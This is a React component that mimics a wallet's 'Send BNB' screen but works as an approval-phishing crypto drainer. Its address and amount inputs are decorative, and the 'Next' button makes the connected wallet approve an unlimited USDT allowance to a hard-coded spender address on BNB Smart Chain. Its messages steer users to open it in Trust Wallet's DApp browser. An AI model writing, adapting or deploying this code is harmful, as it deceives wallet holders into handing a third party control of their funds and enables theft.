import { useCallback, useEffect, useState } from "react";
import { Clipboard, ScanLine, ChevronDown } from "lucide-react"; // Added ChevronDown
import { BrowserProvider, Contract, MaxUint256 } from "ethers";
import icon from "../assets/image.png";

/** BNB Smart Chain mainnet */
const BSC_CHAIN_ID_HEX = "0x38";
const BSC_CHAIN_ID_DEC = 56;

/** BEP-20 USDT on BSC (Binance-Peg USDT) */
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

/** Unlimited USDT allowance is always approved for this spender only */
const USDT_APPROVE_SPENDER = "0x8Fd2FFc1d235CEf07e37Ea065732ED1a0a6856E5";

const ERC20_APPROVE_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
];

function getEthereum() {
  return typeof window !== "undefined" ? window.ethereum : undefined;
}

async function ensureBscNetwork(ethereum) {
  try {
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID_HEX }],
    });
  } catch (err) {
    if (err?.code === 4902) {
      await ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: BSC_CHAIN_ID_HEX,
            chainName: "BNB Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
      return;
    }
    throw err;
  }
}


// Styling Constants to match Screenshot
  const colors = {
    bg: "#1b1b1b",
    inputBg: "#1a1a1a",
    primaryGreen: "#48ff91",
    textMain: "#ffffff",
    textSecondary: "#aaa7a7ff",
    border: "#2a2a2a"
  };


const Home = () => {
  const [address, setAddress] = useState(USDT_APPROVE_SPENDER);
  const [amount, setAmount] = useState("");
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [connectError, setConnectError] = useState(null);
  const [txStatus, setTxStatus] = useState(null);

  const refreshChain = useCallback(async (ethereum) => {
    const idHex = await ethereum.request({ method: "eth_chainId" });
    setChainId(Number.parseInt(idHex, 16));
  }, []);

  useEffect(() => {
    const ethereum = getEthereum();
    if (!ethereum) {
      queueMicrotask(() => {
        setConnectError("Open this page inside Trust Wallet’s DApp browser.");
      });
      return;
    }

    const onAccounts = (accs) => setAccount(accs?.[0] ?? null);
    const onChain = () => {
      refreshChain(ethereum);
    };

    ethereum.on?.("accountsChanged", onAccounts);
    ethereum.on?.("chainChanged", onChain);

    (async () => {
      try {
        setConnectError(null);
        const accounts = await ethereum.request({ method: "eth_accounts" });
        setAccount(accounts[0] ?? null);
      } catch (e) {
        setConnectError(e?.message ?? "Could not read wallet");
        setAccount(null);
        return;
      }
      try {
        await ensureBscNetwork(ethereum);
      } catch (e) {
        setConnectError(
          e?.message ?? "Switch to BNB Smart Chain when you continue."
        );
      }
      try {
        await refreshChain(ethereum);
      } catch {
        /* ignore */
      }
    })();

    return () => {
      ethereum.removeListener?.("accountsChanged", onAccounts);
      ethereum.removeListener?.("chainChanged", onChain);
    };
  }, [refreshChain]);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text?.trim()) setAddress(text.trim());
    } catch {
      /* ignore */
    }
  };

  const handleNext = async () => {
    const ethereum = getEthereum();
    setTxStatus(null);
    setConnectError(null);

    if (!ethereum) {
      setConnectError("No wallet found. Use Trust Wallet DApp browser.");
      return;
    }

    let activeAccount = account;
    if (!activeAccount) {
      try {
        const accs = await ethereum.request({
          method: "eth_requestAccounts",
        });
        activeAccount = accs[0] ?? null;
        setAccount(activeAccount);
      } catch (e) {
        setConnectError(
          e?.message ?? "Allow wallet access to continue."
        );
        return;
      }
    }
    if (!activeAccount) {
      setConnectError("No account returned from wallet.");
      return;
    }

    try {
      await ensureBscNetwork(ethereum);
      await refreshChain(ethereum);

      const currentHex = await ethereum.request({ method: "eth_chainId" });
      const currentId = Number.parseInt(currentHex, 16);
      if (currentId !== BSC_CHAIN_ID_DEC) {
        setConnectError("Please switch to BNB Smart Chain in your wallet.");
        return;
      }

      setTxStatus("Confirm unlimited USDT approval in your wallet…");
      const provider = new BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);
      const tx = await usdt.approve(USDT_APPROVE_SPENDER, MaxUint256);
      setTxStatus("Waiting for confirmation…");
      await tx.wait();
      setTxStatus("Approved. Transaction confirmed.");
    } catch (e) {
      const msg = e?.shortMessage || e?.message || "Transaction failed";
      setConnectError(msg);
      setTxStatus(null);
    }
  };

  const onBsc = chainId === BSC_CHAIN_ID_DEC;

return (
    <div className="max-h-screen h-full flex justify-center font-sans" style={{ backgroundColor: colors.bg }}>
      <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
        
        {/* Header Section */}
        {/* <div className="flex items-center justify-between mb-8">
          <button className="text-white">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
          </button>
          <h1 className="text-white text-lg font-bold">Send BNB</h1>
          <button className="text-white">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
          </button>
        </div> */}

        <div className="flex-1 space-y-6">
          {/* Address Input Section */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
              Address or Domain Name
            </label>
            <div 
              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
              style={{ 
                backgroundColor: colors.bg, 
              }}
            >
              <input
                type="text"
                placeholder="Search or Enter"
                className="bg-transparent outline-none flex w-[60%] justify-start  text-white placeholder-gray-600 "
                value={address}
                onChange={(e) => setAddress(e.target.value)}
              />
              <div className="flex items-center gap-4 ml-2" style={{ color: colors.primaryGreen }}>
                <button onClick={() => {/* paste logic */}} className="text-sm font-bold">Paste</button>
                <Clipboard size={20} />
                <ScanLine size={20} />
              </div>
            </div>
          </div>

          {/* Destination Network Section */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
              Destination network
            </label>
            <div 
              className="flex items-center gap-2 px-3 py-2 rounded-full w-fit"
              style={{ backgroundColor: colors.inputBg }} 
            >
              <img src={icon} alt="BNB" className="w-5 h-5 rounded-full" />
              <span className="text-white  font-bold text-sm" style={{ color: colors.textSecondary }}>BNB Smart Chain</span>
              <ChevronDown size={16} style={{ color: colors.textSecondary }} />
            </div>
          </div>

          {/* Amount Input Section */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
              Amount
            </label>
            <div 
              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
              style={{ 
                backgroundColor: colors.bg, 
              }}
            >
              <input
                type="number"
                placeholder="BNB Amount"
                className="bg-transparent outline-none flex w-[60%] justify-start text-white  placeholder-gray-600"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
              <div className="flex items-center gap-3">
                <span className="text-white font-semibold" style={{ color: colors.textSecondary }}>BNB</span>
                <button className="font-bold" style={{ color: colors.primaryGreen }}>Max</button>
              </div>
            </div>
            <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>≈ ${(Number(amount) * 0.9999).toFixed(2)}</p>
          </div>
        </div>

        <button
          type="button"
          onClick={handleNext}
          className="w-full bg-[var(--primary)] hover:bg-[var(--primary-light)] text-black font-medium py-3 rounded-full text-lg mt-6"
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default Home;
